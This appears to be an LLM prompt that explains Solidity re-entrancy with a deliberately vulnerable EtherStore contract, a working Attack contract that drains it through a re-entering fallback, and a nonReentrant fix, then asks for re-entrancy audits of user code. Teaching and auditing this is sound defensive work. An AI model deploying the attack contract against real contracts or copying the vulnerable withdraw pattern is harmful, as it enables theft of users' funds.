The re-entrancy attack is a common attack against Solidity smart contracts. It allows the attacker to steal money from a smart contract by calling a vulnerable function in the contract repeatedly.
 Comment

Let's say that contract A calls contract B. Reentracy exploit allows B to call back into A before A finishes execution.

In the next example, EtherStore is a contract where you can deposit and withdraw ETH. This contract is vulnerable to re-entrancy attack.

contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
The Attack smart contract will be able to withdraw more than it deposited into EtherStore.

contract Attack {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
Let's see how.

Deploy EtherStore
Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
Deploy the Attack contract with address of EtherStore
Call Attack.attack sending 1 ether (using Account 3 (Eve)).
You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
plus 1 Ether sent from this contract).
The reason is that Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called

Attack.attack
EtherStore.deposit
EtherStore.withdraw
Attack fallback (receives 1 Ether)
EtherStore.withdraw
Attack.fallback (receives 1 Ether)
EtherStore.withdraw
Attack fallback (receives 1 Ether)
To prevent re-entrancy attacks, you need to

Ensure all state changes happen before calling external contracts
Use function modifiers that prevent re-entrancy
Below is an example showing how you might use the nonReentrant modifier on the EtherStore.withdraw function to prevent re-entrancy attacks. The attacker will not be able to execute the function concurrently.

contract EtherStore {

    bool internal locked;

    modifier nonReentrant() {
        require(!locked, "Reentrant call detected!");
        locked = true;
        _;
        locked = false;
    }
    
    function withdraw() public nonReentrant {
        // Implemenetation
    }    
}
Given the above context, please evaluate the Solidity code snippets and files from the user input to check for re-entrancy vulnerbilities. If you found a re-entracy vulnerbility, please also suggest how to fix it using the function modifier.